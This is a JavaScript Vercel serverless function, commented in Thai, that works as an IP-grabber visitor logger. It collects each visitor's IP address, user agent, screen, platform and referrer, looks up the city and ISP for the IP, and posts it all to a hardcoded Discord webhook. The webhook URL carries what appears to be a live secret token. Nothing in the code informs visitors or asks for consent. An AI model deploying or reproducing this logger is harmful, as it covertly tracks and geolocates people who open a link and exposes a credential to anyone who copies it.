// api/log.js — Serverless Function ของ Vercel
export default async function handler(req, res) {
    // อนุญาตเฉพาะ POST
    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    // ─── ใส่ Webhook ของคุณตรงนี้ (คนนอกจะไม่มีทางเห็น) ───
    const WEBHOOK_URL = "https://discord.com/api/webhooks/1564703068631732335/yNVzk4ofyHRKzhsNbxyA9ttm7vLXdOq-hPBv75-tnXE9AcMWEkKnBmBxLKCZBviEA1nX";
    
    if (WEBHOOK_URL.includes("YOUR_ID")) {
        return res.status(500).json({ error: 'Webhook not configured' });
    }

    try {
        // 1. ดึง IP จริง (Vercel จะส่ง IP มาให้ทาง Header)
        const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
        
        // 2. ดึง UA จาก Request Header
        const ua = req.headers['user-agent'] || 'Unknown';
        
        // 3. ดึงข้อมูลที่หน้าเว็บส่งมา
        const { screen, platform, referrer } = req.body || {};

        // 4. (Optional) ดึง Location จาก IP
        let location = "Unknown";
        try {
            const locRes = await fetch(`http://ip-api.com/json/${ip}?fields=country,regionName,city,isp`);
            const locData = await locRes.json();
            if (locData.status === "success") {
                location = `${locData.city}, ${locData.regionName} (${locData.isp})`;
            }
        } catch (e) {}

        // 5. ยิงเข้า Discord
        await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                embeds: [{
                    title: "🎯 ตรวจพบผู้เข้าชมใหม่ (Vercel Secure)",
                    color: 0x5865F2,
                    fields: [
                        { name: "🌐 IP Address", value: `\`${ip}\``, inline: true },
                        { name: "📍 Location", value: `\`${location}\``, inline: true },
                        { name: "🕵️ User-Agent", value: `\`\`\`${ua.substring(0, 200)}\`\`\``, inline: false },
                        { name: "📱 ข้อมูลอุปกรณ์", value: `จอ: \`${screen}\`\nระบบ: \`${platform}\``, inline: false },
                        { name: "🔗 Referrer", value: `\`${referrer}\``, inline: false }
                    ],
                    footer: { text: "Vercel Serverless Logger" },
                    timestamp: new Date().toISOString()
                }]
            })
        });

        return res.status(200).json({ status: 'success' });
    } catch (error) {
        console.error('Error:', error);
        return res.status(500).json({ error: 'Internal server error' });
    }
}
